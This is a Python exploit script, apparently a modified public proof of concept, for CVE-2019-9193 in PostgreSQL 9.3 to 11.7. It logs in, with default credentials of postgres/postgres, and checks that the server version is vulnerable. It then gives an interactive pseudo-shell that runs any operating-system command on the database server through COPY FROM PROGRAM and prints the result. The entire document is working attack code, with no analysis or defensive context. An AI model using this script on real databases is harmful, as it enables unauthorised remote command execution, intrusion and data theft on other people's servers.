# Modified version of the original exploit by b4keSn4ke

# Exploit Title: PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)
# Date: 2022-03-29
# Exploit Author: b4keSn4ke
# Github: https://github.com/b4keSn4ke
# Vendor Homepage: https://www.postgresql.org/
# Software Link: https://www.postgresql.org/download/linux/debian/
# Version: 9.3 - 11.7
# Tested on: Linux x86-64 - Debian 4.19
# CVE: CVE-2019–9193

#!/usr/bin/python3

import psycopg2
import argparse
import hashlib
import time

def parseArgs():
    parser = argparse.ArgumentParser(description='CVE-2019–9193 - PostgreSQL 9.3-11.7 Authenticated Remote Code Execution')
    parser.add_argument('-i', '--ip', nargs='?', type=str, default='127.0.0.1', help='The IP address of the PostgreSQL DB [Default: 127.0.0.1]')
    parser.add_argument('-p', '--port', nargs='?', type=int, default=5432, help='The port of the PostgreSQL DB [Default: 5432]')
    parser.add_argument('-d', '--database', nargs='?', default='template1', help='Name of the PostgreSQL DB [Default: template1]')
    parser.add_argument('-t', '--timeout', nargs='?', type=int, default=10, help='Connection timeout in seconds [Default: 10 (seconds)]')
    parser.add_argument('-U', '--user', nargs='?', default='postgres', help='Username to use to connect to the PostgreSQL DB [Default: postgres]')
    parser.add_argument('-P', '--password', nargs='?', default='postgres', help='Password to use to connect to the the PostgreSQL DB [Default: postgres]')
    args = parser.parse_args()
    return args

def main():
    try:
        print (f"\r\n[+] Connecting to PostgreSQL Database on {args.ip}:{args.port}")
        
        connection = psycopg2.connect (
            database=args.database,
            user=args.user,
            password=args.password,
            host=args.ip,
            port=args.port,
            connect_timeout=args.timeout
        )
        
        print ("[+] Connection to Database established")
        print ("[+] Checking PostgreSQL version")
        checkVersion(connection)
        
        try:
            while True:
                command = input("Pseudoshell:~$ ")
                if(command == "exit"):
                    exit()
                else:
                    exploit(connection, command)
        except KeyboardInterrupt:
            print ("\n[+] Exiting...")
            exit()
        
    except psycopg2.OperationalError as e:
        print (f"\r\n[-] Connection to Database failed: \r\n{e}")
        exit()

def checkVersion(connection):
    cursor = connection.cursor()
    cursor.execute("SELECT version()")
    record = cursor.fetchall()
    cursor.close()

    result = deserialize(record)
    version = float(result[(result.find("PostgreSQL")+11):(result.find("PostgreSQL")+11)+4])

    if (version >= 9.3 and version <= 11.7):
        print(f"[+] PostgreSQL {version} is likely vulnerable")
    else:
        print(f"[-] PostgreSQL {version} is not vulnerable")
        exit()

def deserialize(record):
    result = ""
    for rec in record:
        result += rec[0]+"\r\n"
    return result

def randomizeTableName():
    return ("_" + hashlib.md5(time.ctime().encode('utf-8')).hexdigest())

def exploit(connection, command):
    cursor = connection.cursor()
    tableName = randomizeTableName()
    try:
        cursor.execute(f"DROP TABLE IF EXISTS {tableName};\
                        CREATE TABLE {tableName}(cmd_output text);\
                        COPY {tableName} FROM PROGRAM '{command}';\
                        SELECT * FROM {tableName};")

        record = cursor.fetchall()
        result = deserialize(record)

        print(result)

        cursor.execute(f"DROP TABLE {tableName};")
        cursor.close()

    except psycopg2.errors.ExternalRoutineException as e:
        print (f"[-] Command failed : {e.pgerror}")
        print (f"[+] Deleting table {tableName}\r\n")
        cursor = connection.cursor()
        cursor.execute(f"DROP TABLE {tableName};")
        cursor.close()


if __name__ == "__main__":
    args = parseArgs()
    main()